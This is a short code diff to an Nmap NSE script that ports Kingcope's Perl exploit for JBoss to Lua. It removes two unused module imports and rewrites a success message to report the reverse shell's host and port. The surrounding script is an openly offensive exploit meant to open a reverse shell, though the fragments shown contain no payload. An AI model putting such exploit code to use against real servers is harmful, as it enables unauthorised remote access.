@@ -46,11 +46,9 @@ This exploit is a rewrite to NSE of the Kingcope's perl exploit (daytona_bsh.pl)
 
 
 local nmap = require "nmap"
-local shortport = require "shortport"
 local stdnse = require "stdnse"
 local table = require "table"
 local vulns = require "vulns"
-local nsedebug = require "nsedebug"
 local base64 = require "base64"
 local url = require "url"
 local http = require "http"
@@ -247,7 +245,7 @@ String jsp_file = jboss_home + "/deploy/]]
             if (res ~= nil and res['status'] ~= nil and
                 res['status'] == 200) then
 
-               vuln.extra_info = "EXPLOIT SUCCESSFULL EXECUTED, VERIFY YOUR REVERSE SHELL"
+               vuln.extra_info = ("EXPLOIT SUCCESSFULL, REVERSE SHELL AT %s:%s"):format(reverse_host, reverse_port)
                vuln.state = vulns.STATE.EXPLOIT
                
                return vuln_report:make_output(vuln)
